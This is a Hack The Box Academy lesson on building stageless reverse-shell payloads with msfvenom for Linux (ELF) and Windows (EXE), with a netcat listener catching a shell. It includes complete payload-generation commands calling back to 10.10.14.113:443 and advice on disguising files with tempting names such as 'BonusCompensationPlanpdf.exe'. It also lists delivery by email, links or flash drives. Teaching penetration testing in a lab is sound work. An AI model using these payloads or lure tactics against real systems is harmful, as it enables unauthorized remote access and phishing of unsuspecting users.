#### List Payloads

```shell
gdxqpardo@htb[/htb]$ msfvenom -l payloads
```

## Building A Stageless Payload

Now let's build a simple stageless payload with msfvenom and break down the command.

#### Build It

Crafting Payloads with MSFvenom

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

#### Call MSFvenom

Crafting Payloads with MSFvenom

```shell-session
msfvenom
```

Defines the tool used to make the payload.

#### Creating a Payload

Crafting Payloads with MSFvenom

```shell-session
-p 
```

This `option` indicates that msfvenom is creating a payload.

#### Choosing the Payload based on Architecture

Crafting Payloads with MSFvenom

```shell-session
linux/x64/shell_reverse_tcp 
```

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

#### Address To Connect Back To

Crafting Payloads with MSFvenom

```shell-session
LHOST=10.10.14.113 LPORT=443 
```

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).

#### Format To Generate Payload In

Crafting Payloads with MSFvenom

```shell-session
-f elf 
```

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Output

Crafting Payloads with MSFvenom

```shell-session
> createbackup.elf
```

Creates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.

---

## Executing a Stageless Payload

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.

## Building a simple Stageless Payload for a Windows system

We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.

#### Windows Payload

Crafting Payloads with MSFvenom

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

The command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.

---

## Executing a Simple Stageless Payload On a Windows System

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.

![image](https://academy.hackthebox.com/storage/modules/115/winpayload.png)

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

Crafting Payloads with MSFvenom

```shell-session
gdxqpardo@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

